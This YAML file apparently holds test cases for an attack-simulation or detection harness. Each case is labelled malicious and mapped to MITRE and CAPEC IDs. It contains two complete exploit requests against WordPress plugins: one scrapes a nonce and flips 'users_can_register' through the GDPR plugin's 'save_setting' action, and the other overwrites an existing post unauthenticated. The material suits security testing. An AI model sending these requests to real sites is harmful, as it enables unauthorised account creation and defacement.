- name: corp-option-flip
  malicious: true
  stage: escalate-privileges
  technique: T1190
  pattern: CAPEC-1
  expect: "users_can_register"
  correlation: marker
  request:
    method: POST
    path: /wp-admin/admin-ajax.php
    prefetch:
      from: /
      pattern: '"ajaxSecurity":"([a-f0-9]+)"'
    params:
      action: "wpgdprc_process_action"
      security: "{nonce}"
    data:
      data: '{"type":"save_setting","append":false,"option":"users_can_register","value":"1"}'

- name: corp-content-write
  malicious: true
  stage: complete-mission
  technique: T1565
  pattern: CAPEC-242
  expect: "rbsm_submit_post"
  correlation: marker
  request:
    method: POST
    path: /wp-admin/admin-ajax.php
    prefetch:
      from: /submit-a-story/
      pattern: '"nonce":"([a-f0-9]+)"'
    data:
      action: "rbsm_submit_post"
      _nonce: "{nonce}"
      formId: "1"
      postId: "1"
      title: "Defaced by an unauthenticated guest"
      excerpt: "overwritten without owning this post"
      content: "overwritten without owning this post"
      userName: "Anonymous"
      userEmail: "anon@example.com"
